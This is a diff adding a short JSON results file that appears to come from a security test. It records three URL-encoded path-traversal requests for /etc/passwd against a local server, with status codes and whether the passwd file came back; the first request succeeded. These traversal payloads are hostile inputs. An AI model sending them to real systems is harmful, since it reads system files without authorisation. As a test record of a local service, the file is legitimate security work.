@@ -1,0 +1,20 @@
+[
+  {
+    "url": "http://127.0.0.1:18080/demo-console/%2e%2e/%2e%2e/etc/passwd",
+    "status": 200,
+    "passwd_signature": true,
+    "body_bytes": 739
+  },
+  {
+    "url": "http://127.0.0.1:18080/downloads/%2e%2e/%2e%2e/etc/passwd",
+    "status": 200,
+    "passwd_signature": false,
+    "body_bytes": 946
+  },
+  {
+    "url": "http://127.0.0.1:18080/tianshu/%2e%2e/%2e%2e/etc/passwd",
+    "status": 200,
+    "passwd_signature": false,
+    "body_bytes": 946
+  }
+]
